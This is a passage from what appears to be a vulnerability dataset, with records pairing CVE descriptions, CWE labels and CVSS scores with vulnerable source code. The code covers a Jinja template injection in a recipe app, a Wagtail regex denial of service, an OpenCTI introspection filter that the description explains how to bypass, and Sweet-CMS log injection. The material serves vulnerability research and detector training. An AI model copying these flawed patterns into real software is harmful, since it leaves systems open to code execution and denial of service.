          "content": "from gettext import gettext as _\n\nimport bleach\nimport markdown as md\nfrom jinja2 import Template, TemplateSyntaxError, UndefinedError\nfrom markdown.extensions.tables import TableExtension\n\nfrom cookbook.helper.mdx_attributes import MarkdownFormatExtension\nfrom cookbook.helper.mdx_urlize import UrlizeExtension\n\n\nclass IngredientObject(object):\n    amount = \"\"\n    unit = \"\"\n    food = \"\"\n    note = \"\"\n    numeric_amount = 0\n\n    def __init__(self, ingredient):\n        if ingredient.no_amount:\n            self.amount = \"\"\n        else:\n            self.amount = f\"<scalable-number v-bind:number='{bleach.clean(str(ingredient.amount))}' v-bind:factor='ingredient_factor'></scalable-number>\"\n            self.numeric_amount = float(ingredient.amount)\n        if ingredient.unit:\n            if ingredient.unit.plural_name in (None, \"\"):\n                self.unit = bleach.clean(str(ingredient.unit))\n            else:\n                if ingredient.always_use_plural_unit or ingredient.amount > 1 and not ingredient.no_amount:\n                    self.unit = bleach.clean(ingredient.unit.plural_name)\n                else:\n                    self.unit = bleach.clean(str(ingredient.unit))\n        else:\n            self.unit = \"\"\n        if ingredient.food:\n            if ingredient.food.plural_name in (None, \"\"):\n                self.food = bleach.clean(str(ingredient.food))\n            else:\n                if ingredient.always_use_plural_food or ingredient.amount > 1 and not ingredient.no_amount:\n                    self.food = bleach.clean(str(ingredient.food.plural_name))\n                else:\n                    self.food = bleach.clean(str(ingredient.food))\n        else:\n            self.food = \"\"\n        self.note = bleach.clean(str(ingredient.note))\n\n    def __str__(self):\n        ingredient = self.amount\n        if self.unit != \"\":\n            ingredient += f' {self.unit}'\n        return f'{ingredient} {self.food}'\n\n\ndef render_instructions(step):  # TODO deduplicate markdown cleanup code\n    instructions = step.instruction\n\n    tags = {\n        \"h1\", \"h2\", \"h3\", \"h4\", \"h5\", \"h6\",\n        \"b\", \"i\", \"strong\", \"em\", \"tt\",\n        \"p\", \"br\",\n        \"span\", \"div\", \"blockquote\", \"code\", \"pre\", \"hr\",\n        \"ul\", \"ol\", \"li\", \"dd\", \"dt\",\n        \"img\",\n        \"a\",\n        \"sub\", \"sup\",\n        'pre', 'table', 'td', 'tr', 'th', 'tbody', 'style', 'thead'\n    }\n    parsed_md = md.markdown(\n        instructions,\n        extensions=[\n            'markdown.extensions.fenced_code', TableExtension(),\n            UrlizeExtension(), MarkdownFormatExtension()\n        ]\n    )\n    markdown_attrs = {\n        \"*\": [\"id\", \"class\", 'width', 'height'],\n        \"img\": [\"src\", \"alt\", \"title\"],\n        \"a\": [\"href\", \"alt\", \"title\"],\n    }\n\n    instructions = bleach.clean(parsed_md, tags, markdown_attrs)\n\n    ingredients = []\n\n    for i in step.ingredients.all():\n        ingredients.append(IngredientObject(i))\n\n    def scale(number):\n        return f\"<scalable-number v-bind:number='{bleach.clean(str(number))}' v-bind:factor='ingredient_factor'></scalable-number>\"\n\n    try:\n        template = Template(instructions)\n        instructions = template.render(ingredients=ingredients, scale=scale)\n    except TemplateSyntaxError:\n        return _('Could not parse template code.') + ' Error: Template Syntax broken'\n    except UndefinedError:\n        return _('Could not parse template code.') + ' Error: Undefined Error'\n\n    return instructions\n"
        }
      ],
      "method_level": [
        "def render_instructions(step):  # TODO deduplicate markdown cleanup code\n    instructions = step.instruction\n\n    tags = {\n        \"h1\", \"h2\", \"h3\", \"h4\", \"h5\", \"h6\",\n        \"b\", \"i\", \"strong\", \"em\", \"tt\",\n        \"p\", \"br\",\n        \"span\", \"div\", \"blockquote\", \"code\", \"pre\", \"hr\",\n        \"ul\", \"ol\", \"li\", \"dd\", \"dt\",\n        \"img\",\n        \"a\",\n        \"sub\", \"sup\",\n        'pre', 'table', 'td', 'tr', 'th', 'tbody', 'style', 'thead'\n    }\n    parsed_md = md.markdown(\n        instructions,\n        extensions=[\n            'markdown.extensions.fenced_code', TableExtension(),\n            UrlizeExtension(), MarkdownFormatExtension()\n        ]\n    )\n    markdown_attrs = {\n        \"*\": [\"id\", \"class\", 'width', 'height'],\n        \"img\": [\"src\", \"alt\", \"title\"],\n        \"a\": [\"href\", \"alt\", \"title\"],\n    }\n\n    instructions = bleach.clean(parsed_md, tags, markdown_attrs)\n\n    ingredients = []\n\n    for i in step.ingredients.all():\n        ingredients.append(IngredientObject(i))\n\n    def scale(number):\n        return f\"<scalable-number v-bind:number='{bleach.clean(str(number))}' v-bind:factor='ingredient_factor'></scalable-number>\"\n\n    try:\n        template = Template(instructions)\n        instructions = template.render(ingredients=ingredients, scale=scale)\n    except TemplateSyntaxError:\n        return _('Could not parse template code.') + ' Error: Template Syntax broken'\n    except UndefinedError:\n        return _('Could not parse template code.') + ' Error: Undefined Error'\n\n    return instructions"
      ],
      "hunk_level": [
        {
          "line_no": 92,
          "content": "        template = Template(instructions)"
        },
        {
          "line_no": 93,
          "content": "        instructions = template.render(ingredients=ingredients, scale=scale)"
        }
      ]
    },
    "cwe": [
      "CWE-1336",
      "CWE-94"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.9,
    "cvss_version": 3.1
  },
  {
    "id": 966,
    "cve": "CVE-2024-39317",
    "description": "Wagtail is an open source content management system built on Django. A bug in Wagtail's `parse_query_string` would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, `parse_query_string` would take an unexpectedly large amount of time to process, resulting in a denial of service. In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses `parse_query_string`, it may be exploitable by other users (e.g. unauthenticated users). Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "wagtail/search/utils.py",
          "content": "import operator\nimport re\nfrom functools import partial\n\nfrom django.apps import apps\nfrom django.db import connections\nfrom django.http import QueryDict\n\nfrom wagtail.search.index import RelatedFields, SearchField\n\nfrom .query import MATCH_NONE, Phrase, PlainText\n\nNOT_SET = object()\n\n\ndef balanced_reduce(operator, seq, initializer=NOT_SET):\n    \"\"\"\n    Has the same result as Python's reduce function, but performs the calculations in a different order.\n\n    This is important when the operator is constructing data structures such as search query classes.\n    This method will make the resulting data structures flatter, so operations that need to traverse\n    them don't end up crashing with recursion errors.\n\n    For example:\n\n    Python's builtin reduce() function will do the following calculation:\n\n    reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    (1 + (2 + (3 + (4 + (5 + (6 + (7 + 8)))))))\n\n    When using this with query classes, it would create a large data structure with a depth of 7\n    Whereas balanced_reduce will execute this like so:\n\n    balanced_reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    ((1 + 2) + (3 + 4)) + ((5 + 6) + (7 + 8))\n\n    Which only has a depth of 2\n    \"\"\"\n    # Casting all iterables to list makes the implementation simpler\n    if not isinstance(seq, list):\n        seq = list(seq)\n\n    # Note, it needs to be possible to use None as an initial value\n    if initializer is not NOT_SET:\n        if len(seq) == 0:\n            return initializer\n        else:\n            return operator(initializer, balanced_reduce(operator, seq))\n\n    if len(seq) == 0:\n        raise TypeError(\"reduce() of empty sequence with no initial value\")\n    elif len(seq) == 1:\n        return seq[0]\n    else:\n        break_point = len(seq) // 2\n        first_set = balanced_reduce(operator, seq[:break_point])\n        second_set = balanced_reduce(operator, seq[break_point:])\n        return operator(first_set, second_set)\n\n\n# Reduce any iterable to a single value using a logical OR e.g. (a | b | ...)\nOR = partial(balanced_reduce, operator.or_)\n# Reduce any iterable to a single value using a logical AND e.g. (a & b & ...)\nAND = partial(balanced_reduce, operator.and_)\n# Reduce any iterable to a single value using an addition\nADD = partial(balanced_reduce, operator.add)\n# Reduce any iterable to a single value using a multiplication\nMUL = partial(balanced_reduce, operator.mul)\n\nMAX_QUERY_STRING_LENGTH = 255\n\n\ndef normalise_query_string(query_string):\n    # Truncate query string\n    query_string = query_string[:MAX_QUERY_STRING_LENGTH]\n    # Convert query_string to lowercase\n    query_string = query_string.lower()\n\n    # Remove leading, trailing and multiple spaces\n    query_string = re.sub(\" +\", \" \", query_string).strip()\n\n    return query_string\n\n\ndef separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string\n\n\ndef parse_query_string(query_string, operator=None, zero_terms=MATCH_NONE):\n    \"\"\"\n    This takes a query string typed in by a user and extracts the following:\n\n     - Quoted terms (for phrase search)\n     - Filters\n\n    For example, the following query:\n\n      `hello \"this is a phrase\" live:true` would be parsed into:\n\n    filters: {'live': 'true'}\n    tokens: And([PlainText('hello'), Phrase('this is a phrase')])\n    \"\"\"\n    filters, query_string = separate_filters_from_query(query_string)\n\n    is_phrase = False\n    tokens = []\n    if '\"' in query_string:\n        parts = query_string.split('\"')\n    else:\n        parts = query_string.split(\"'\")\n\n    for part in parts:\n        part = part.strip()\n\n        if part:\n            if is_phrase:\n                tokens.append(Phrase(part))\n            else:\n                tokens.append(\n                    PlainText(part, operator=operator or PlainText.DEFAULT_OPERATOR)\n                )\n\n        is_phrase = not is_phrase\n\n    if tokens:\n        if operator == \"or\":\n            search_query = OR(tokens)\n        else:\n            search_query = AND(tokens)\n    else:\n        search_query = zero_terms\n\n    return filters, search_query\n\n\ndef get_descendant_models(model):\n    \"\"\"\n    Returns all descendants of a model, including the model itself.\n    \"\"\"\n    descendant_models = {\n        other_model\n        for other_model in apps.get_models()\n        if issubclass(other_model, model)\n    }\n    descendant_models.add(model)\n    return descendant_models\n\n\ndef get_content_type_pk(model):\n    # We import it locally because this file is loaded before apps are ready.\n    from django.contrib.contenttypes.models import ContentType\n\n    return ContentType.objects.get_for_model(model).pk\n\n\ndef get_ancestors_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the ancestors of this model, excluding it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *model._meta.get_parent_list()\n        ).values()\n    ]\n\n\ndef get_descendants_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the descendants of this model, including it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *get_descendant_models(model)\n        ).values()\n    ]\n\n\ndef get_search_fields(search_fields):\n    for search_field in search_fields:\n        if isinstance(search_field, SearchField):\n            yield search_field\n        elif isinstance(search_field, RelatedFields):\n            yield from get_search_fields(search_field.fields)\n\n\ndef get_postgresql_connections():\n    return [\n        connection\n        for connection in connections.all()\n        if connection.vendor == \"postgresql\"\n    ]\n"
        }
      ],
      "method_level": [
        "def separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string"
      ],
      "hunk_level": [
        {
          "line_no": 86,
          "content": "    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'"
        },
        {
          "line_no": 89,
          "content": "    for match_object in re.finditer(filters_regexp, query_string):"
        },
        {
          "line_no": 91,
          "content": "        filters.update("
        },
        {
          "line_no": 92,
          "content": "            {"
        },
        {
          "line_no": 93,
          "content": "                key: value.strip('\"')"
        },
        {
          "line_no": 94,
          "content": "                if value.strip('\"') is not value"
        },
        {
          "line_no": 95,
          "content": "                else value.strip(\"'\")"
        },
        {
          "line_no": 96,
          "content": "            }"
        },
        {
          "line_no": 97,
          "content": "        )"
        },
        {
          "line_no": 99,
          "content": "    query_string = re.sub(filters_regexp, \"\", query_string).strip()"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 1299,
    "cve": "CVE-2024-37155",
    "description": "OpenCTI is an open source platform allowing organizations to manage their cyber threat intelligence knowledge and observables. Prior to version 6.1.9, the regex validation used to prevent Introspection queries can be bypassed by removing the extra whitespace, carriage return, and line feed characters from the query. GraphQL Queries in OpenCTI can be validated using the `secureIntrospectionPlugin`. The regex check in the plkugin can be bypassed by removing the carriage return and line feed characters (`\\r\\n`).  Running a curl command against a local instance of OpenCTI will result in a limited error message. By running the same Introspection query without the `\\r\\n` characters, the unauthenticated user is able to successfully run a full Introspection query. Bypassing this restriction allows the attacker to gather a wealth of information about the GraphQL endpoint functionality that can be used to perform actions and/or read data without authorization.  These queries can also be weaponized to conduct a Denial of Service (DoS) attack if sent repeatedly. Users should upgrade to version 6.1.9 to receive a patch for the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "opencti-platform/opencti-graphql/src/graphql/graphql.js",
          "content": "import { ApolloServer, UserInputError } from 'apollo-server-express';\nimport { ApolloServerPluginLandingPageGraphQLPlayground, ApolloServerPluginLandingPageDisabled } from 'apollo-server-core';\nimport { formatError as apolloFormatError } from 'apollo-errors';\nimport { ApolloArmor } from '@escape.tech/graphql-armor';\nimport { dissocPath } from 'ramda';\nimport { createValidation as createAliasBatch } from 'graphql-no-alias';\nimport ConstraintDirectiveError from 'graphql-constraint-directive/lib/error';\nimport { constraintDirectiveDocumentation, createApolloQueryValidationPlugin } from 'graphql-constraint-directive';\nimport { GraphQLError } from 'graphql/error';\nimport createSchema from './schema';\nimport conf, { basePath, DEV_MODE, PLAYGROUND_INTROSPECTION_DISABLED, ENABLED_TRACING, PLAYGROUND_ENABLED, GRAPHQL_ARMOR_ENABLED, logApp } from '../config/conf';\nimport { authenticateUserFromRequest, userWithOrigin } from '../domain/user';\nimport { ForbiddenAccess, ValidationError } from '../config/errors';\nimport loggerPlugin from './loggerPlugin';\nimport telemetryPlugin from './telemetryPlugin';\nimport httpResponsePlugin from './httpResponsePlugin';\nimport { executionContext } from '../utils/access';\n\nconst createApolloServer = () => {\n  let schema = createSchema();\n  // graphql-constraint-directive plugin configuration\n  const formats = {\n    'not-blank': (value) => {\n      if (value.length > 0 && value.trim() === '') {\n        throw new GraphQLError('Value cannot have only whitespace(s)');\n      }\n      return true;\n    }\n  };\n  const constraintPlugin = createApolloQueryValidationPlugin({ schema }, { formats });\n  schema = constraintDirectiveDocumentation()(schema);\n  const apolloPlugins = [loggerPlugin, httpResponsePlugin, constraintPlugin];\n  // Protect batch graphql through alias usage\n  const batchPermissions = {\n    Query: {\n      '*': conf.get('app:graphql:batching_protection:query_default') ?? 2, // default value for all queries\n      subTypes: conf.get('app:graphql:batching_protection:query_subtypes') ?? 4 // subTypes are used multiple times for schema fetching\n    },\n    Mutation: {\n      '*': conf.get('app:graphql:batching_protection:mutation_default') ?? 1, // default value for all mutations\n      token: 1 // force default value for login mutation\n    }\n  };\n  const { validation: batchValidationRule } = createAliasBatch({ permissions: batchPermissions });\n  const apolloValidationRules = [batchValidationRule];\n  // optional graphql-armor plugin configuration\n  // Still disable by default for now as required more testing\n  if (GRAPHQL_ARMOR_ENABLED) {\n    const armor = new ApolloArmor({\n      blockFieldSuggestion: { // It will prevent suggesting fields in case of an erroneous request.\n        enabled: true,\n      },\n      costLimit: { // Blocking too expensive requests (DoS attack attempts).\n        maxCost: 10000\n      },\n      maxAliases: { // Limit the number of aliases in a document.\n        enabled: false, // Handled by graphql-no-alias\n      },\n      maxDepth: { // maxDepth: Limit the depth of a document.\n        n: 20,\n      },\n      maxDirectives: { // Limit the number of directives in a document.\n        n: 50,\n      },\n      maxTokens: { // Limit the number of GraphQL tokens in a document.\n        n: 2000,\n      }\n    });\n    const protection = armor.protect();\n    apolloPlugins.push(...protection.plugins);\n    apolloValidationRules.push(...protection.validationRules);\n  }\n  // In production mode, we use static from the server\n  const playgroundOptions = DEV_MODE ? { settings: { 'request.credentials': 'include' } } : {\n    cdnUrl: `${basePath}/static`,\n    title: 'OpenCTI Playground',\n    faviconUrl: `${basePath}/static/@apollographql/graphql-playground-react@1.7.42/build/static/favicon.png`,\n    settings: { 'request.credentials': 'include' }\n  };\n  const playgroundPlugin = ApolloServerPluginLandingPageGraphQLPlayground(playgroundOptions);\n  apolloPlugins.push(PLAYGROUND_ENABLED ? playgroundPlugin : ApolloServerPluginLandingPageDisabled());\n  // Schema introspection must be accessible only for auth users.\n  const introspectionPatterns = ['__schema {', '__schema(', '__type {', '__type('];\n  const secureIntrospectionPlugin = {\n    requestDidStart: ({ request, context }) => {\n      // Is schema introspection request\n      if (introspectionPatterns.some((pattern) => request.query.includes(pattern))) {\n        // If introspection explicitly disabled or user is not authenticated\n        if (!PLAYGROUND_ENABLED || PLAYGROUND_INTROSPECTION_DISABLED || !context.user) {\n          throw ForbiddenAccess('GraphQL introspection not authorized!');\n        }\n      }\n    },\n  };\n  apolloPlugins.push(secureIntrospectionPlugin);\n  if (ENABLED_TRACING) {\n    apolloPlugins.push(telemetryPlugin);\n  }\n  const apolloServer = new ApolloServer({\n    schema,\n    introspection: true, // Will be disabled by plugin if needed\n    persistedQueries: false,\n    validationRules: apolloValidationRules,\n    async context({ req, res }) {\n      const executeContext = executionContext('api');\n      executeContext.req = req;\n      executeContext.res = res;\n      // Building context from request headers\n      executeContext.workId = req.headers['opencti-work-id']; // Api call comes from a worker processing\n      executeContext.eventId = req.headers['opencti-event-id']; // Api call is due to listening event\n      executeContext.previousStandard = req.headers['previous-standard']; // Previous standard id\n      executeContext.synchronizedUpsert = req.headers['synchronized-upsert'] === 'true'; // If full sync needs to be done\n      try {\n        const user = await authenticateUserFromRequest(executeContext, req, res);\n        if (user) {\n          executeContext.user = userWithOrigin(req, user);\n        }\n      } catch (error) {\n        logApp.error(error);\n      }\n      return executeContext;\n    },\n    tracing: DEV_MODE,\n    plugins: apolloPlugins,\n    formatError: (error) => {\n      let e = apolloFormatError(error);\n      if (e instanceof UserInputError) {\n        if (e.originalError instanceof ConstraintDirectiveError) {\n          const { originalError } = e.originalError;\n          const { fieldName } = originalError;\n          const ConstraintError = ValidationError(fieldName, originalError);\n          e = apolloFormatError(ConstraintError);\n        }\n      }\n      // Remove the exception stack in production.\n      return DEV_MODE ? e : dissocPath(['extensions', 'exception'], e);\n    },\n  });\n  return { schema, apolloServer };\n};\n\nexport default createApolloServer;\n"
        }
      ],
      "method_level": [
        "createApolloServer = () => {\n  let schema = createSchema();\n  // graphql-constraint-directive plugin configuration\n  const formats = {\n    'not-blank': (value) => {\n      if (value.length > 0 && value.trim() === '') {\n        throw new GraphQLError('Value cannot have only whitespace(s)');\n      }\n      return true;\n    }\n  };\n  const constraintPlugin = createApolloQueryValidationPlugin({ schema }, { formats });\n  schema = constraintDirectiveDocumentation()(schema);\n  const apolloPlugins = [loggerPlugin, httpResponsePlugin, constraintPlugin];\n  // Protect batch graphql through alias usage\n  const batchPermissions = {\n    Query: {\n      '*': conf.get('app:graphql:batching_protection:query_default') ?? 2, // default value for all queries\n      subTypes: conf.get('app:graphql:batching_protection:query_subtypes') ?? 4 // subTypes are used multiple times for schema fetching\n    },\n    Mutation: {\n      '*': conf.get('app:graphql:batching_protection:mutation_default') ?? 1, // default value for all mutations\n      token: 1 // force default value for login mutation\n    }\n  };\n  const { validation: batchValidationRule } = createAliasBatch({ permissions: batchPermissions });\n  const apolloValidationRules = [batchValidationRule];\n  // optional graphql-armor plugin configuration\n  // Still disable by default for now as required more testing\n  if (GRAPHQL_ARMOR_ENABLED) {\n    const armor = new ApolloArmor({\n      blockFieldSuggestion: { // It will prevent suggesting fields in case of an erroneous request.\n        enabled: true,\n      },\n      costLimit: { // Blocking too expensive requests (DoS attack attempts).\n        maxCost: 10000\n      },\n      maxAliases: { // Limit the number of aliases in a document.\n        enabled: false, // Handled by graphql-no-alias\n      },\n      maxDepth: { // maxDepth: Limit the depth of a document.\n        n: 20,\n      },\n      maxDirectives: { // Limit the number of directives in a document.\n        n: 50,\n      },\n      maxTokens: { // Limit the number of GraphQL tokens in a document.\n        n: 2000,\n      }\n    });\n    const protection = armor.protect();\n    apolloPlugins.push(...protection.plugins);\n    apolloValidationRules.push(...protection.validationRules);\n  }\n  // In production mode, we use static from the server\n  const playgroundOptions = DEV_MODE ? { settings: { 'request.credentials': 'include' } } : {\n    cdnUrl: `${basePath}/static`,\n    title: 'OpenCTI Playground',\n    faviconUrl: `${basePath}/static/@apollographql/graphql-playground-react@1.7.42/build/static/favicon.png`,\n    settings: { 'request.credentials': 'include' }\n  };\n  const playgroundPlugin = ApolloServerPluginLandingPageGraphQLPlayground(playgroundOptions);\n  apolloPlugins.push(PLAYGROUND_ENABLED ? playgroundPlugin : ApolloServerPluginLandingPageDisabled());\n  // Schema introspection must be accessible only for auth users.\n  const introspectionPatterns = ['__schema {', '__schema(', '__type {', '__type('];\n  const secureIntrospectionPlugin = {\n    requestDidStart: ({ request, context }) => {\n      // Is schema introspection request\n      if (introspectionPatterns.some((pattern) => request.query.includes(pattern))) {\n        // If introspection explicitly disabled or user is not authenticated\n        if (!PLAYGROUND_ENABLED || PLAYGROUND_INTROSPECTION_DISABLED || !context.user) {\n          throw ForbiddenAccess('GraphQL introspection not authorized!');\n        }\n      }\n    },\n  };\n  apolloPlugins.push(secureIntrospectionPlugin);\n  if (ENABLED_TRACING) {\n    apolloPlugins.push(telemetryPlugin);\n  }\n  const apolloServer = new ApolloServer({\n    schema,\n    introspection: true, // Will be disabled by plugin if needed\n    persistedQueries: false,\n    validationRules: apolloValidationRules,\n    async context({ req, res }) {\n      const executeContext = executionContext('api');\n      executeContext.req = req;\n      executeContext.res = res;\n      // Building context from request headers\n      executeContext.workId = req.headers['opencti-work-id']; // Api call comes from a worker processing\n      executeContext.eventId = req.headers['opencti-event-id']; // Api call is due to listening event\n      executeContext.previousStandard = req.headers['previous-standard']; // Previous standard id\n      executeContext.synchronizedUpsert = req.headers['synchronized-upsert'] === 'true'; // If full sync needs to be done\n      try {\n        const user = await authenticateUserFromRequest(executeContext, req, res);\n        if (user) {\n          executeContext.user = userWithOrigin(req, user);\n        }\n      } catch (error) {\n        logApp.error(error);\n      }\n      return executeContext;\n    },\n    tracing: DEV_MODE,\n    plugins: apolloPlugins,\n    formatError: (error) => {\n      let e = apolloFormatError(error);\n      if (e instanceof UserInputError) {\n        if (e.originalError instanceof ConstraintDirectiveError) {\n          const { originalError } = e.originalError;\n          const { fieldName } = originalError;\n          const ConstraintError = ValidationError(fieldName, originalError);\n          e = apolloFormatError(ConstraintError);\n        }\n      }\n      // Remove the exception stack in production.\n      return DEV_MODE ? e : dissocPath(['extensions', 'exception'], e);\n    },\n  });\n  return { schema, apolloServer };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "  const introspectionPatterns = ['__schema {', '__schema(', '__type {', '__type('];"
        },
        {
          "line_no": 86,
          "content": "      // Is schema introspection request"
        },
        {
          "line_no": 87,
          "content": "      if (introspectionPatterns.some((pattern) => request.query.includes(pattern))) {"
        }
      ]
    },
    "cwe": [
      "CWE-284"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 1126,
    "cve": "CVE-2024-8334",
    "description": "A vulnerability was found in master-nan Sweet-CMS up to 5f441e022b8876f07cde709c77b5be6d2f262e3f. It has been rated as problematic. This issue affects the function LogHandler of the file middleware/log.go. The manipulation leads to improper output neutralization for logs. The attack may be initiated remotely. This product takes the approach of rolling releases to provide continious delivery. Therefore, version details for affected and updated releases are not available. The identifier of the patch is 2024c370e6c78b07b358c9d4257fa5d1be732c38. It is recommended to apply a patch to fix this issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "middleware/log.go",
          "content": "/**\n * @Author: Nan\n * @Date: 2023/3/18 17:04\n */\n\npackage middleware\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/gin-gonic/gin/binding\"\n\t\"go.uber.org/zap\"\n\t\"sweet-cms/form/response\"\n\t\"sweet-cms/model\"\n\t\"sweet-cms/service\"\n\t\"time\"\n)\n\nfunc LogHandler(logService *service.LogService) gin.HandlerFunc {\n\treturn func(c *gin.Context) {\n\t\tzap.L().Info(\"Access Log start\")\n\t\tstartTime := time.Now()\n\t\tvar body interface{}\n\t\tvar query = c.Request.URL.Query()\n\t\t_ = c.ShouldBindBodyWith(&body, binding.JSON)\n\n\t\tblw := &response.BufferedResponseWriter{\n\t\t\tResponseWriter: c.Writer,\n\t\t\tBody:           bytes.NewBufferString(\"\"),\n\t\t}\n\t\tc.Writer = blw\n\n\t\tc.Next()\n\t\tduration := time.Since(startTime)\n\t\tresponseBody := blw.Body.String()\n\n\t\tqueryStr, _ := json.Marshal(query)\n\t\tbodyStr, _ := json.Marshal(body)\n\n\t\t//responseStatus := blw.Status()\n\t\tvar accessLog = model.AccessLog{\n\t\t\tBasic:    model.Basic{},\n\t\t\tMethod:   c.Request.Method,\n\t\t\tIp:       c.ClientIP(),\n\t\t\tLocality: \"\",\n\t\t\tUrl:      c.Request.URL.Path,\n\t\t\tBody:     string(bodyStr),\n\t\t\tQuery:    string(queryStr),\n\t\t\tResponse: responseBody,\n\t\t}\n\t\terr := logService.CreateAccessLog(c, accessLog)\n\t\tif err != nil {\n\t\t\tzap.L().Error(\"日志存储异常。。。。\", zap.Error(err))\n\t\t}\n\t\tzap.L().Info(\"用户访问日志:\",\n\t\t\tzap.String(\"uri\", c.Request.URL.Path),\n\t\t\tzap.String(\"method\", c.Request.Method),\n\t\t\tzap.Any(\"query\", c.Request.URL.Query()),\n\t\t\tzap.Any(\"body\", c.Request.Body),\n\t\t\tzap.Any(\"response\", responseBody),\n\t\t\tzap.String(\"ip\", c.ClientIP()),\n\t\t\tzap.String(\"duration\", fmt.Sprintf(\"%.4f seconds\", duration.Seconds())))\n\t\tzap.L().Info(\"Access Log end\")\n\t}\n}\n"
        }
      ],
      "method_level": [
        "func LogHandler(logService *service.LogService) gin.HandlerFunc {\n\treturn func(c *gin.Context) {\n\t\tzap.L().Info(\"Access Log start\")\n\t\tstartTime := time.Now()\n\t\tvar body interface{}\n\t\tvar query = c.Request.URL.Query()\n\t\t_ = c.ShouldBindBodyWith(&body, binding.JSON)\n\n\t\tblw := &response.BufferedResponseWriter{\n\t\t\tResponseWriter: c.Writer,\n\t\t\tBody:           bytes.NewBufferString(\"\"),\n\t\t}\n\t\tc.Writer = blw\n\n\t\tc.Next()\n\t\tduration := time.Since(startTime)\n\t\tresponseBody := blw.Body.String()\n\n\t\tqueryStr, _ := json.Marshal(query)\n\t\tbodyStr, _ := json.Marshal(body)\n\n\t\t//responseStatus := blw.Status()\n\t\tvar accessLog = model.AccessLog{\n\t\t\tBasic:    model.Basic{},\n\t\t\tMethod:   c.Request.Method,\n\t\t\tIp:       c.ClientIP(),\n\t\t\tLocality: \"\",\n\t\t\tUrl:      c.Request.URL.Path,\n\t\t\tBody:     string(bodyStr),\n\t\t\tQuery:    string(queryStr),\n\t\t\tResponse: responseBody,\n\t\t}\n\t\terr := logService.CreateAccessLog(c, accessLog)\n\t\tif err != nil {\n\t\t\tzap.L().Error(\"日志存储异常。。。。\", zap.Error(err))\n\t\t}\n\t\tzap.L().Info(\"用户访问日志:\",\n\t\t\tzap.String(\"uri\", c.Request.URL.Path),\n\t\t\tzap.String(\"method\", c.Request.Method),\n\t\t\tzap.Any(\"query\", c.Request.URL.Query()),\n\t\t\tzap.Any(\"body\", c.Request.Body),\n\t\t\tzap.Any(\"response\", responseBody),\n\t\t\tzap.String(\"ip\", c.ClientIP()),\n\t\t\tzap.String(\"duration\", fmt.Sprintf(\"%.4f seconds\", duration.Seconds())))\n\t\tzap.L().Info(\"Access Log end\")\n\t}\n}"
      ],
      "hunk_level": [
        {
          "line_no": 49,
          "content": "\t\t\tBody:     string(bodyStr),"
        },
        {
          "line_no": 50,
          "content": "\t\t\tQuery:    string(queryStr),"
        },
        {
          "line_no": 51,
          "content": "\t\t\tResponse: responseBody,"
        },
        {
          "line_no": 60,
          "content": "\t\t\tzap.Any(\"query\", c.Request.URL.Query()),"
        },
        {
          "line_no": 61,
          "content": "\t\t\tzap.Any(\"body\", c.Request.Body),"
        },
        {
          "line_no": 62,
          "content": "\t\t\tzap.Any(\"response\", responseBody),"
        }
      ]
    },
    "cwe": [
      "CWE-117"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 4.0
  },
  {
    "id": 693,
    "cve": "CVE-2024-31992",
    "description": "Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, the safe_scrape_html function utilizes a user-controlled URL to issue a request to a remote server, however these requests are not rate-limited. While there are efforts to prevent DDoS by implementing a timeout on requests, it is possible for an attacker to issue a large number of requests to the server which will be handled in batches based on the configuration of the Mealie server. The chunking of responses is helpful for mitigating memory exhaustion on the Mealie server, however a single request to an arbitrarily large external file (e.g. a Debian ISO) is often sufficient to completely saturate a CPU core assigned to the Mealie container. Without rate limiting in place, it is possible to not only sustain traffic against an external target indefinitely, but also to exhaust the CPU resources assigned to the Mealie container. This vulnerability is fixed in 1.4.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "mealie/services/recipe/recipe_data_service.py",
